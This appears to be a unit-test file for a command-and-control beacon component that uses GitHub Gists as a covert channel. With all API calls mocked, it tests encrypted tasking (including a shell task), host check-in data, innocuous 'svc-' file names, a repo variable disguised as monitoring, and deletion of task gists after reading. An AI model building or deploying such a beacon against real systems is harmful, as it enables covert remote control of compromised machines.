import { describe, it, expect, mock, beforeEach } from "bun:test";

// Mock must be declared before the module is imported
const mockGists = {
  list:   mock(async () => ({ data: [] })),
  get:    mock(async () => ({ data: { id: "gist123", files: {}, updated_at: "2024-01-01T00:00:00Z" } })),
  create: mock(async () => ({ data: { id: "new-gist-id" } })),
  delete: mock(async () => ({})),
};
const mockActions = {
  getRepoVariable: mock(async () => ({ data: { value: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" } })),
};
const mockRepos = { get: mock(async () => ({})) };

mock.module("@octokit/rest", () => ({
  Octokit: class {
    hook = { wrap: (_name: string, _fn: Function) => {} };
    rest = { gists: mockGists, actions: mockActions, repos: mockRepos };
  },
}));

import { GistTentacle } from "../tentacles/GistTentacle.ts";
import { generateKeyPair, bytesToBase64, encryptBox } from "../crypto/sodium.ts";
import type { BeaconConfig } from "../types.ts";

async function makeConfig(): Promise<BeaconConfig> {
  const kp = await generateKeyPair();
  return {
    id: "abcd1234-5678-90ab-cdef-1234567890ab",
    repo: { owner: "testowner", name: "testrepo" },
    token: "ghp_test",
    tentaclePriority: ["gist"],
    sleepSeconds: 60,
    jitter: 0.3,
    operatorPublicKey: new Uint8Array(32),
    beaconKeyPair: kp,
  };
}

const PAYLOAD = {
  beaconId: "abcd1234-5678-90ab-cdef-1234567890ab",
  publicKey: "",
  hostname: "host", username: "user", os: "linux", arch: "x64",
  pid: 1234, checkinAt: new Date().toISOString(),
};

describe("GistTentacle", () => {
  beforeEach(() => {
    mockGists.list.mockClear();
    mockGists.get.mockClear();
    mockGists.create.mockClear();
    mockGists.delete.mockClear();
    mockActions.getRepoVariable.mockClear();
    mockRepos.get.mockClear();
  });

  it("isAvailable returns true when gists.list succeeds", async () => {
    const t = new GistTentacle(await makeConfig());
    expect(await t.isAvailable()).toBe(true);
    expect(mockGists.list).toHaveBeenCalledTimes(1);
  });

  it("isAvailable returns false when gists.list throws", async () => {
    mockGists.list.mockImplementationOnce(async () => {
      throw Object.assign(new Error("401 Unauthorized"), { status: 401 });
    });
    const t = new GistTentacle(await makeConfig());
    expect(await t.isAvailable()).toBe(false);
  });

  it("checkin sends ACK gist on first call and returns [] when no task gist found", async () => {
    // list returns empty (no task gist)
    mockGists.list.mockResolvedValueOnce({ data: [] });
    const t = new GistTentacle(await makeConfig());
    const tasks = await t.checkin(PAYLOAD);
    expect(tasks).toEqual([]);
    // ACK gist should have been created
    expect(mockGists.create).toHaveBeenCalledTimes(1);
    const createCall = mockGists.create.mock.calls[0]![0] as any;
    const fileKeys = Object.keys(createCall.files as object);
    expect(fileKeys[0]).toMatch(/^svc-a-/);
  });

  it("checkin returns [] when task gist updatedAt is unchanged", async () => {
    const cfg = await makeConfig();
    const id8 = cfg.id.slice(0, 8);
    const taskFilename = `svc-t-${id8}.json`;

    const taskGist = {
      id: "task-gist-id",
      updated_at: "2024-06-01T00:00:00Z",
      files: { [taskFilename]: { filename: taskFilename } },
    };

    // First checkin: ACK + finds task gist with updated_at
    mockGists.list
      .mockResolvedValueOnce({ data: [taskGist] })   // for ACK path (first checkin)
      .mockResolvedValueOnce({ data: [taskGist] });  // second checkin

    mockGists.get.mockResolvedValueOnce({
      data: {
        id: "task-gist-id",
        files: { [taskFilename]: { content: "bad-json" } },
        updated_at: "2024-06-01T00:00:00Z",
      },
    });

    const t = new GistTentacle(cfg);
    // First checkin sets lastTaskUpdatedAt (decrypt fails gracefully → [])
    await t.checkin(PAYLOAD);
    mockGists.get.mockClear();

    // Second checkin — same updatedAt, should bail early
    const tasks = await t.checkin({ ...PAYLOAD });
    expect(tasks).toEqual([]);
    // gists.get should NOT have been called (cached updatedAt short-circuits)
    expect(mockGists.get).not.toHaveBeenCalled();
  });

  it("checkin decrypts tasks from task gist (full crypto round-trip)", async () => {
    const operatorKp = await generateKeyPair();
    const cfg = await makeConfig();
    const opPubB64 = await bytesToBase64(operatorKp.publicKey);
    mockActions.getRepoVariable.mockResolvedValue({ data: { value: opPubB64 } });

    const id8 = cfg.id.slice(0, 8);
    const taskFilename = `svc-t-${id8}.json`;

    const taskList = [{ taskId: "t1", kind: "shell" as const, args: { cmd: "id" }, ref: "r1" }];
    const encrypted = await encryptBox(
      JSON.stringify(taskList),
      cfg.beaconKeyPair.publicKey,
      operatorKp.secretKey,
    );
    const blobContent = JSON.stringify(encrypted);

    const taskGist = {
      id: "task-gist-crypto",
      updated_at: "2024-07-01T00:00:00Z",
      files: { [taskFilename]: { filename: taskFilename } },
    };

    // First checkin: list returns task gist
    mockGists.list.mockResolvedValueOnce({ data: [taskGist] });
    mockGists.get.mockResolvedValueOnce({
      data: {
        id: "task-gist-crypto",
        files: { [taskFilename]: { content: blobContent } },
        updated_at: "2024-07-01T00:00:00Z",
      },
    });
    mockGists.delete.mockResolvedValueOnce({});

    const t = new GistTentacle(cfg);
    const tasks = await t.checkin({ ...PAYLOAD, beaconId: cfg.id });
    expect(tasks).toHaveLength(1);
    expect(tasks[0]!.taskId).toBe("t1");
    expect(mockGists.delete).toHaveBeenCalledTimes(1);  // task gist deleted after read
  });

  it("submitResult creates a result gist", async () => {
    const t = new GistTentacle(await makeConfig());
    await t.submitResult({
      taskId: "t1", beaconId: "abcd1234-5678-90ab-cdef-1234567890ab",
      success: true, output: "hello", completedAt: new Date().toISOString(),
    });
    expect(mockGists.create).toHaveBeenCalledTimes(1);
    const createCall = mockGists.create.mock.calls[0]![0] as any;
    const fileKeys = Object.keys(createCall.files as object);
    expect(fileKeys[0]).toMatch(/^svc-r-/);
  });

  it("teardown deletes the ACK gist when ackGistId is set", async () => {
    mockGists.list.mockResolvedValueOnce({ data: [] });
    const t = new GistTentacle(await makeConfig());
    // First checkin to set ackGistId
    await t.checkin(PAYLOAD);
    mockGists.delete.mockClear();

    await t.teardown();
    expect(mockGists.delete).toHaveBeenCalledTimes(1);
    expect((mockGists.delete.mock.calls[0]![0] as any).gist_id).toBe("new-gist-id");
  });

  it("checkin does not create duplicate ACK gist on second call", async () => {
    // Both checkin calls get an empty gist list (no task gist)
    mockGists.list
      .mockResolvedValueOnce({ data: [] })
      .mockResolvedValueOnce({ data: [] });

    const t = new GistTentacle(await makeConfig());
    await t.checkin(PAYLOAD);
    await t.checkin(PAYLOAD);

    // ACK gist created exactly once for the session
    expect(mockGists.create).toHaveBeenCalledTimes(1);
    // list was called once per checkin
    expect(mockGists.list).toHaveBeenCalledTimes(2);
  });

  it("checkin returns [] and does not throw when gists.get throws", async () => {
    const cfg = await makeConfig();
    const id8 = cfg.id.slice(0, 8);
    const taskFilename = `svc-t-${id8}.json`;
    const taskGist = {
      id: "task-gist-throw",
      updated_at: "2024-08-01T00:00:00Z",
      files: { [taskFilename]: { filename: taskFilename } },
    };

    mockGists.list.mockResolvedValueOnce({ data: [taskGist] });
    mockGists.get.mockImplementationOnce(async () => {
      throw new Error("network error");
    });

    const t = new GistTentacle(cfg);
    const tasks = await t.checkin(PAYLOAD);
    expect(tasks).toEqual([]);
  });

  it("checkin returns [] gracefully when MONITORING_PUBKEY variable returns empty value", async () => {
    const cfg = await makeConfig();
    const id8 = cfg.id.slice(0, 8);
    const taskFilename = `svc-t-${id8}.json`;
    const taskGist = {
      id: "task-gist-empty-key",
      updated_at: "2024-09-01T00:00:00Z",
      files: { [taskFilename]: { filename: taskFilename } },
    };

    // Return a task gist so checkin tries to fetch the key
    mockGists.list.mockResolvedValueOnce({ data: [taskGist] });
    // Empty public key value
    mockActions.getRepoVariable.mockResolvedValueOnce({ data: { value: "" } });
    mockGists.get.mockResolvedValueOnce({
      data: {
        id: "task-gist-empty-key",
        files: { [taskFilename]: { content: JSON.stringify({ nonce: "x", ciphertext: "y", senderPublicKey: "z" }) } },
        updated_at: "2024-09-01T00:00:00Z",
      },
    });

    const t = new GistTentacle(cfg);
    const tasks = await t.checkin(PAYLOAD);
    expect(tasks).toEqual([]);
  });

  it("teardown does nothing when ackGistId is null (no first checkin)", async () => {
    const t = new GistTentacle(await makeConfig());
    // Never called checkin — ackGistId is null
    await expect(t.teardown()).resolves.toBeUndefined();
    expect(mockGists.delete).not.toHaveBeenCalled();
  });
});
